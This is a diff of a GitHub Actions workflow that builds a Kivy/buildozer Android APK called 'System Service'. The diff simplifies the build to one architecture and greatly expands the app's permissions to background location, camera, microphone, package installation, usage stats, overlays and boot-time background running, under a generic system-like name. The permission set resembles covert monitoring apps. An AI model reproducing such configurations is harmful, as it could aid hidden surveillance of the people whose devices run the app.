@@ -7,7 +7,7 @@ on:
 
 jobs:
   build-android:
-    name: Build Android APK (Multi-Arch)
+    name: Build Android APK (armeabi-v7a)
     runs-on: ubuntu-22.04
     timeout-minutes: 120
     
@@ -47,107 +47,79 @@ jobs:
       - name: Setup Android SDK
         run: |
           ANDROID_SDK_ROOT=$HOME/.buildozer/android/platform/android-sdk
-          mkdir -p $ANDROID_SDK_ROOT
-          cd $ANDROID_SDK_ROOT
-          
+          mkdir -p $ANDROID_SDK_ROOT && cd $ANDROID_SDK_ROOT
           wget -q https://dl.google.com/android/repository/commandlinetools-linux-9477386_latest.zip
-          unzip -q commandlinetools-linux-9477386_latest.zip
-          rm commandlinetools-linux-9477386_latest.zip
-          
+          unzip -q commandlinetools-linux-9477386_latest.zip && rm commandlinetools-linux-9477386_latest.zip
           mkdir -p cmdline-tools/latest
-          if [ -d "cmdline-tools/bin" ]; then
-            mv cmdline-tools/* cmdline-tools/latest/ 2>/dev/null || true
-          fi
-          
-          mkdir -p tools/bin
-          ln -sf $ANDROID_SDK_ROOT/cmdline-tools/latest/bin/sdkmanager $ANDROID_SDK_ROOT/tools/bin/sdkmanager
+          [ -d "cmdline-tools/bin" ] && mv cmdline-tools/* cmdline-tools/latest/ 2>/dev/null || true
+          mkdir -p tools/bin && ln -sf $ANDROID_SDK_ROOT/cmdline-tools/latest/bin/sdkmanager $ANDROID_SDK_ROOT/tools/bin/sdkmanager
           chmod +x $ANDROID_SDK_ROOT/cmdline-tools/latest/bin/*
-          
           mkdir -p licenses
-          echo -e "\n8933bad161af4178b1185d1a37fbf41ea5269c55\nd56f5187479451eabf01fb78af6dfcb131a6481e\n24333f8a63b6825ea9c5514f83c2829b004d1fee" > licenses/android-sdk-license
-          
+          printf "8933bad161af4178b1185d1a37fbf41ea5269c55\nd56f5187479451eabf01fb78af6dfcb131a6481e\n24333f8a63b6825ea9c5514f83c2829b004d1fee\n" > licenses/android-sdk-license
           yes | $ANDROID_SDK_ROOT/cmdline-tools/latest/bin/sdkmanager --sdk_root=$ANDROID_SDK_ROOT \
-            "platform-tools" \
-            "platforms;android-33" \
-            "build-tools;33.0.0" \
-            2>/dev/null || true
-          
+            "platform-tools" "platforms;android-33" "build-tools;33.0.0" 2>/dev/null || true
           echo "ANDROID_HOME=$ANDROID_SDK_ROOT" >> $GITHUB_ENV
           echo "ANDROID_SDK_ROOT=$ANDROID_SDK_ROOT" >> $GITHUB_ENV
           echo "$ANDROID_SDK_ROOT/cmdline-tools/latest/bin" >> $GITHUB_PATH
           echo "$ANDROID_SDK_ROOT/tools/bin" >> $GITHUB_PATH
           echo "$ANDROID_SDK_ROOT/platform-tools" >> $GITHUB_PATH
       
-      # 🔑 Download and setup NDK 25b manually
-      - name: Setup NDK 25b
+      - name: Download NDK 25b
+        id: ndk
         run: |
-          echo "Downloading NDK 25b..."
-          NDK_VERSION="25.2.9519653"
-          NDK_ZIP="android-ndk-r25b-linux.zip"
-          NDK_URL="https://dl.google.com/android/repository/${NDK_ZIP}"
-          
-          cd /tmp
-          wget -q --show-progress "$NDK_URL" || curl -L -o "$NDK_ZIP" "$NDK_URL"
-          
-          echo "Extracting NDK..."
-          unzip -q "$NDK_ZIP"
-          rm "$NDK_ZIP"
-          
-          # Move to buildozer expected location
-          BUILDOZER_NDK_DIR="$HOME/.buildozer/android/platform"
-          mkdir -p "$BUILDOZER_NDK_DIR"
-          
-          # Remove old NDK if exists
-          rm -rf "$BUILDOZER_NDK_DIR/android-ndk-r25b" 2>/dev/null || true
-          
-          # Move the extracted NDK
-          mv android-ndk-r25b "$BUILDOZER_NDK_DIR/android-ndk-r25b"
-          
-          # Verify installation
-          echo "NDK installed at: $BUILDOZER_NDK_DIR/android-ndk-r25b"
-          if [ -f "$BUILDOZER_NDK_DIR/android-ndk-r25b/ndk-build" ]; then
-            echo "✅ NDK 25b installed successfully!"
-          else
-            echo "❌ NDK installation failed!"
-            exit 1
-          fi
-          
-          # Set environment variable
-          echo "ANDROID_NDK_HOME=$BUILDOZER_NDK_DIR/android-ndk-r25b" >> $GITHUB_ENV
-      
-      - name: Clean old buildozer cache
+          NDK_DIR="$HOME/.buildozer/android/platform/android-ndk-r25b"
+          [ -f "$NDK_DIR/ndk-build" ] && { echo "ndk-path=$NDK_DIR" >> $GITHUB_OUTPUT; exit 0; }
+          for url in \
+            "https://dl.google.com/android/repository/android-ndk-r25b-linux.zip" \
+            "https://dl.google.com/android/repository/android-ndk-r25c-linux.zip"; do
+            curl -sL -o /tmp/ndk.zip "$url" && [ $(stat -c%s /tmp/ndk.zip) -gt 1000000 ] && break
+            rm -f /tmp/ndk.zip
+          done
+          [ ! -f /tmp/ndk.zip ] && { echo "❌ NDK download failed"; exit 1; }
+          rm -rf /tmp/ndk-extract "$NDK_DIR"
+          mkdir -p /tmp/ndk-extract && unzip -q -o /tmp/ndk.zip -d /tmp/ndk-extract && rm -f /tmp/ndk.zip
+          NDK_SRC=$(find /tmp/ndk-extract -maxdepth 2 -name "ndk-build" -type f | head -1 | xargs dirname)
+          mv "$NDK_SRC" "$NDK_DIR" && rm -rf /tmp/ndk-extract
+          echo "ndk-path=$NDK_DIR" >> $GITHUB_OUTPUT
+          echo "✅ NDK 25b ready"
+
+      - name: Clean previous builds
         run: |
           rm -rf ~/.buildozer/android/platform/build-* 2>/dev/null || true
           rm -rf .buildozer 2>/dev/null || true
-          echo "Cleaned old build cache"
-      
-      - name: Verify required files exist
+          rm -rf bin 2>/dev/null || true
+          echo "Cleaned"
+
+      - name: Cache build dependencies
+        uses: actions/cache@v4
+        with:
+          path: ~/.buildozer
+          key: ${{ runner.os }}-buildozer-armeabi-v7a-${{ hashFiles('buildozer.spec', 'main.py', 'service.py') }}
+          restore-keys: |
+            ${{ runner.os }}-buildozer-armeabi-v7a-
+
+      - name: Verify files exist
         run: |
-          echo "=== Checking required files ==="
-          if [ -f "main.py" ]; then 
-            echo "✅ main.py found ($(wc -l < main.py) lines)"
-          else 
-            echo "❌ main.py MISSING"
-            exit 1
-          fi
-          if [ -f "service.py" ]; then 
-            echo "✅ service.py found ($(wc -l < service.py) lines)"
-          else 
-            echo "❌ service.py MISSING"
-            exit 1
-          fi
-          echo "=== Files in repository ==="
+          if [ -f "main.py" ]; then echo "✅ main.py found ($(wc -l < main.py) lines)"; else echo "❌ main.py MISSING"; exit 1; fi
+          if [ -f "service.py" ]; then echo "✅ service.py found ($(wc -l < service.py) lines)"; else echo "❌ service.py MISSING"; exit 1; fi
           ls -la
-      
-      # 🔑 BUILD 1: armeabi-v7a with NDK 25b + Python 3.10 (STABLE)
-      - name: Build armeabi-v7a (NDK 25b + Python 3.10)
+
+      - name: Build APK
+        id: build
         run: |
           echo "============================================"
-          echo "BUILDING armeabi-v7a with NDK 25b + Python 3.10"
+          echo "BUILDING armeabi-v7a APK"
+          echo "NDK: 25b | Kivy: stable (SDL2)"
+          echo "Arch: armeabi-v7a"
           echo "============================================"
           
-          # Create buildozer.spec for armeabi-v7a
-          cat > buildozer_armeabi-v7a.spec << 'SPECEOF'
+          NDK="${{ steps.ndk.outputs.ndk-path }}"
+          [ ! -f "$NDK/ndk-build" ] && { echo "❌ NDK missing"; exit 1; }
+          
+          unset ANDROID_NDK_ROOT ANDROID_NDK_HOME NDK_ROOT
+          export ANDROID_NDK_HOME="$NDK"
+          
+          cat > buildozer.spec << 'SPECEOF'
           [app]
           title = System Service
           package.name = systemservice
@@ -159,122 +131,19 @@ jobs:
           source.exclude_dirs = tests, bin, venv
           source.exclude_patterns = license,images/*/*.jpg
           version = 0.1
-          requirements = python3==3.10.12,kivy==2.3.0,pyjnius,android,plyer
+          requirements = python3,kivy,pyjnius,android,plyer
           orientation = portrait
           services = Service:service.py
           service.source = %(source.dir)s/service.py
-          android.permissions = INTERNET,ACCESS_NETWORK_STATE,ACCESS_WIFI_STATE,\
-              FOREGROUND_SERVICE,FOREGROUND_SERVICE_DATA_SYNC,FOREGROUND_SERVICE_SPECIAL_USE,\
-              WAKE_LOCK,RECEIVE_BOOT_COMPLETED,REQUEST_IGNORE_BATTERY_OPTIMIZATIONS,\
-              POWER_SAVE_MODE_CHANGED,ACCESS_BACKGROUND_SERVICE,\
-              READ_PHONE_STATE,READ_EXTERNAL_STORAGE,WRITE_EXTERNAL_STORAGE
-          android.features = android.hardware.wifi
+          android.permissions = INTERNET,ACCESS_NETWORK_STATE,ACCESS_WIFI_STATE,CHANGE_WIFI_STATE,CHANGE_NETWORK_STATE,ACCESS_FINE_LOCATION,ACCESS_COARSE_LOCATION,ACCESS_BACKGROUND_LOCATION,FOREGROUND_SERVICE,FOREGROUND_SERVICE_DATA_SYNC,FOREGROUND_SERVICE_SPECIAL_USE,FOREGROUND_SERVICE_LOCATION,WAKE_LOCK,RECEIVE_BOOT_COMPLETED,REQUEST_IGNORE_BATTERY_OPTIMIZATIONS,REQUEST_SCHEDULE_EXACT_ALARM,SCHEDULE_EXACT_ALARM,USE_EXACT_ALARM,POWER_SAVE_MODE_CHANGED,ACCESS_BACKGROUND_SERVICE,READ_PHONE_STATE,READ_EXTERNAL_STORAGE,WRITE_EXTERNAL_STORAGE,MANAGE_EXTERNAL_STORAGE,POST_NOTIFICATIONS,SYSTEM_ALERT_WINDOW,REQUEST_INSTALL_PACKAGES,QUERY_ALL_PACKAGES,PACKAGE_USAGE_STATS,BLUETOOTH,BLUETOOTH_ADMIN,BLUETOOTH_CONNECT,BLUETOOTH_SCAN,VIBRATE,CAMERA,RECORD_AUDIO,MODIFY_AUDIO_SETTINGS,BODY_SENSORS,ACTIVITY_RECOGNITION
+          android.features = android.hardware.wifi,android.hardware.location,android.hardware.bluetooth
           android.api = 33
           android.minapi = 21
           android.ndk = 25b
           android.archs = armeabi-v7a
-          android.gradle_dependencies = 'androidx.core:core:1.10.1'
+          android.gradle_dependencies = androidx.core:core:1.10.1
           android.accept_sdk_agreement = True
-          android.allow_backup = True
-          android.private_storage = True
-          android.presplash_color = #000000
-          android.wakelock = True
-          android.hide_loading_screen = True
-          android.enable_androidx = True
-          android.debug = True
-          android.notification_channel_name = System Service
-          android.notification_title = Running Background Service
-          android.notification_text = Service is running in background
-          android.notification_importance = low
-          android.foreground_service_type = dataSync
-          p4a.branch = master
-          android.p4a_bootstrap = sdl2
-          fullscreen = 0
-          log_level = 2
-          android.logcat = 1
-          android.release_artifact = apk
-          [buildozer]
-          log_level = 2
-          SPECEOF
-          
-          # Build
-          export AUTORECONF=/usr/bin/autoreconf
-          export AUTOCONF=/usr/bin/autoconf
-          export AUTOMAKE=/usr/bin/automake
-          export ACLOCAL=/usr/bin/aclocal
-          export LIBTOOLIZE=/usr/bin/libtoolize
-          
-          cat > /tmp/autoreconf << 'AUTOWRAP'
-          #!/bin/bash
-          for f in configure configure.ac; do
-            if [ -f "$f" ] && grep -q "LT_SYS_SYMBOL_USCORE" "$f" 2>/dev/null; then
-              echo "[FIX] Patching $f..."
-              sed -i 's/LT_SYS_SYMBOL_USCORE/AC_CHECK_FUNCS(rindex)/g' "$f"
-            fi
-          done
-          /usr/bin/autoreconf "$@"
-          AUTOWRAP
-          chmod +x /tmp/autoreconf
-          export PATH="/tmp:$PATH"
-          
-          buildozer --spec buildozer_armeabi-v7a.spec android debug 2>&1 | tee build_armeabi-v7a.log
-          BUILD_EXIT=${PIPESTATUS[0]}
-          
-          echo "armeabi-v7a build exit code: $BUILD_EXIT"
-          
-          mkdir -p bin/armeabi-v7a
-          find . -name "*.apk" -type f -exec cp {} bin/armeabi-v7a/ \; 2>/dev/null || true
-          find ~/.buildozer -name "*.apk" -type f -exec cp {} bin/armeabi-v7a/ \; 2>/dev/null || true
-          echo "armeabi-v7a APKs: $(ls bin/armeabi-v7a/*.apk 2>/dev/null | wc -l)"
-          
-          if [ "$BUILD_EXIT" -ne 0 ]; then
-            echo "⚠️ armeabi-v7a build failed, continuing..."
-          fi
-      
-      # 🔑 Clean between builds to avoid conflicts
-      - name: Clean build artifacts for next arch
-        run: |
-          echo "Cleaning build artifacts before arm64-v8a build..."
-          rm -rf .buildozer/android/platform/build-* 2>/dev/null || true
-          rm -rf ~/.buildozer/android/platform/build-* 2>/dev/null || true
-          echo "Cleaned"
-      
-      # 🔑 BUILD 2: arm64-v8a with NDK 25b + Python 3.10 (via develop branch)
-      - name: Build arm64-v8a (NDK 25b + Python 3.10)
-        run: |
-          echo "============================================"
-          echo "BUILDING arm64-v8a with NDK 25b + Python 3.10"
-          echo "============================================"
-          
-          # Create buildozer.spec for arm64-v8a
-          cat > buildozer_arm64-v8a.spec << 'SPECEOF'
-          [app]
-          title = System Service
-          package.name = systemservice
-          package.domain = org.example
-          source.dir = .
-          source.include_exts = py,png,jpg,kv,atlas,ttf
-          source.include_patterns = assets/*,images/*.png
-          source.exclude_exts = spec
-          source.exclude_dirs = tests, bin, venv
-          source.exclude_patterns = license,images/*/*.jpg
-          version = 0.1
-          requirements = python3==3.10.12,kivy==2.3.0,pyjnius,android,plyer
-          orientation = portrait
-          services = Service:service.py
-          service.source = %(source.dir)s/service.py
-          android.permissions = INTERNET,ACCESS_NETWORK_STATE,ACCESS_WIFI_STATE,\
-              FOREGROUND_SERVICE,FOREGROUND_SERVICE_DATA_SYNC,FOREGROUND_SERVICE_SPECIAL_USE,\
-              WAKE_LOCK,RECEIVE_BOOT_COMPLETED,REQUEST_IGNORE_BATTERY_OPTIMIZATIONS,\
-              POWER_SAVE_MODE_CHANGED,ACCESS_BACKGROUND_SERVICE,\
-              READ_PHONE_STATE,READ_EXTERNAL_STORAGE,WRITE_EXTERNAL_STORAGE
-          android.features = android.hardware.wifi
-          android.api = 33
-          android.minapi = 21
-          android.ndk = 25b
-          android.archs = arm64-v8a
-          android.gradle_dependencies = 'androidx.core:core:1.10.1'
-          android.accept_sdk_agreement = True
+          android.skip_update = True
           android.allow_backup = True
           android.private_storage = True
           android.presplash_color = #000000
@@ -297,98 +166,64 @@ jobs:
           log_level = 2
           SPECEOF
           
-          # Build
-          export AUTORECONF=/usr/bin/autoreconf
-          export AUTOCONF=/usr/bin/autoconf
-          export AUTOMAKE=/usr/bin/automake
-          export ACLOCAL=/usr/bin/aclocal
-          export LIBTOOLIZE=/usr/bin/libtoolize
+          echo "=== buildozer.spec created ==="
+          
+          # Fix autoreconf
+          export AUTORECONF=/usr/bin/autoreconf AUTOCONF=/usr/bin/autoconf
+          export AUTOMAKE=/usr/bin/automake ACLOCAL=/usr/bin/aclocal LIBTOOLIZE=/usr/bin/libtoolize
           
           cat > /tmp/autoreconf << 'AUTOWRAP'
           #!/bin/bash
           for f in configure configure.ac; do
-            if [ -f "$f" ] && grep -q "LT_SYS_SYMBOL_USCORE" "$f" 2>/dev/null; then
-              echo "[FIX] Patching $f..."
-              sed -i 's/LT_SYS_SYMBOL_USCORE/AC_CHECK_FUNCS(rindex)/g' "$f"
-            fi
+            [ -f "$f" ] && grep -q "LT_SYS_SYMBOL_USCORE" "$f" 2>/dev/null && sed -i 's/LT_SYS_SYMBOL_USCORE/AC_CHECK_FUNCS(rindex)/g' "$f"
           done
           /usr/bin/autoreconf "$@"
           AUTOWRAP
           chmod +x /tmp/autoreconf
           export PATH="/tmp:$PATH"
           
-          buildozer --spec buildozer_arm64-v8a.spec android debug 2>&1 | tee build_arm64-v8a.log
+          set +e
+          buildozer android debug 2>&1 | tee build.log
           BUILD_EXIT=${PIPESTATUS[0]}
-          
-          echo "arm64-v8a build exit code: $BUILD_EXIT"
-          
-          mkdir -p bin/arm64-v8a
-          find . -name "*.apk" -type f -exec cp {} bin/arm64-v8a/ \; 2>/dev/null || true
-          find ~/.buildozer -name "*.apk" -type f -exec cp {} bin/arm64-v8a/ \; 2>/dev/null || true
-          echo "arm64-v8a APKs: $(ls bin/arm64-v8a/*.apk 2>/dev/null | wc -l)"
-          
-          if [ "$BUILD_EXIT" -ne 0 ]; then
-            echo "⚠️ arm64-v8a build failed, continuing..."
-          fi
-      
-      # 🔑 COMBINE: Collect all APKs
-      - name: Combine into fat APK
-        id: build
-        run: |
-          echo "============================================"
-          echo "COLLECTING APKs"
-          echo "============================================"
-          
-          mkdir -p bin/combined
-          
-          ARMV7_COUNT=$(ls bin/armeabi-v7a/*.apk 2>/dev/null | wc -l)
-          ARM64_COUNT=$(ls bin/arm64-v8a/*.apk 2>/dev/null | wc -l)
-          
-          echo "armeabi-v7a APKs: $ARMV7_COUNT"
-          echo "arm64-v8a APKs: $ARM64_COUNT"
-          
-          if [ "$ARMV7_COUNT" -gt 0 ]; then
-            cp bin/armeabi-v7a/*.apk bin/combined/ 2>/dev/null || true
-            echo "✅ Copied armeabi-v7a APK(s)"
-          fi
-          
-          if [ "$ARM64_COUNT" -gt 0 ]; then
-            cp bin/arm64-v8a/*.apk bin/combined/ 2>/dev/null || true
-            echo "✅ Copied arm64-v8a APK(s)"
-          fi
+          set -e
           
           echo ""
-          echo "=== Combined APKs ==="
-          ls -lh bin/combined/ 2>/dev/null || echo "No APKs found"
+          echo "Build exit code: $BUILD_EXIT"
           
-          TOTAL=$(ls bin/combined/*.apk 2>/dev/null | wc -l)
-          if [ "$TOTAL" -gt 0 ]; then
-            echo "apk_created=true" >> $GITHUB_OUTPUT
-            echo "✅ At least one APK created successfully!"
+          mkdir -p apk-output
+          find /home/runner -name "*.apk" -type f 2>/dev/null -exec cp {} apk-output/ \;
+          find . -name "*.apk" -type f 2>/dev/null -exec cp {} apk-output/ \;
+          
+          if ls apk-output/*.apk 2>/dev/null 1>&2; then
+            echo "apk_found=true" >> $GITHUB_OUTPUT
+            echo ""
+            echo "✅ APK(s) found:"
+            ls -lh apk-output/*.apk
           else
-            echo "apk_created=false" >> $GITHUB_OUTPUT
-            echo "❌ No APKs were created"
+            echo "apk_found=false" >> $GITHUB_OUTPUT
+            echo ""
+            echo "❌ No APK found"
+            echo ""
+            echo "=== Errors ==="
+            grep -iE "\[ERROR\]|Command failed|fatal:" build.log | grep -v "configure\|checking\|unsupported\|config.pxi\|prerequisites" | tail -20
           fi
+          
+          exit $BUILD_EXIT
       
-      - name: Upload All APKs
-        if: steps.build.outputs.apk_created == 'true'
+      - name: Upload APK
+        if: steps.build.outputs.apk_found == 'true'
         uses: actions/upload-artifact@v4
         with:
-          name: Android-APKs-${{ github.run_number }}
-          path: |
-            bin/combined/*.apk
-            bin/armeabi-v7a/*.apk
-            bin/arm64-v8a/*.apk
+          name: armeabi-v7a-APK-${{ github.run_number }}
+          path: apk-output/*.apk
           retention-days: 30
       
-      - name: Upload Build Logs (ALWAYS)
+      - name: Upload Build Logs
         if: always()
         uses: actions/upload-artifact@v4
         with:
           name: build-logs-${{ github.run_number }}
-          path: |
-            build_armeabi-v7a.log
-            build_arm64-v8a.log
+          path: build.log
           retention-days: 7
       
       - name: Build Summary
@@ -398,20 +233,17 @@ jobs:
           echo "BUILD SUMMARY"
           echo "============================================"
           echo "Job Status: ${{ job.status }}"
+          echo "NDK: 25b"
+          echo "Architecture: armeabi-v7a"
+          echo "Kivy: stable (SDL2)"
           echo ""
-          echo "📦 armeabi-v7a (NDK 25b + Python 3.10):"
-          echo "   $(ls bin/armeabi-v7a/*.apk 2>/dev/null | wc -l) APK(s)"
-          echo ""
-          echo "📦 arm64-v8a (NDK 25b + Python 3.10):"
-          echo "   $(ls bin/arm64-v8a/*.apk 2>/dev/null | wc -l) APK(s)"
-          echo ""
-          if ls bin/combined/*.apk 2>/dev/null 1>&2; then
-            echo "✅ APKs CREATED!"
-            ls -lh bin/combined/*.apk 2>/dev/null
+          if ls apk-output/*.apk 2>/dev/null 1>&2; then
+            echo "✅ APK CREATED!"
+            ls -lh apk-output/*.apk
             echo ""
-            echo "📥 Download artifact: Android-APKs-${{ github.run_number }}"
+            echo "📥 Download artifact: armeabi-v7a-APK-${{ github.run_number }}"
           else
-            echo "❌ NO APKs CREATED"
+            echo "❌ NO APK CREATED"
             echo ""
             echo "📥 Download artifact: build-logs-${{ github.run_number }}"
             echo "   to inspect build errors"
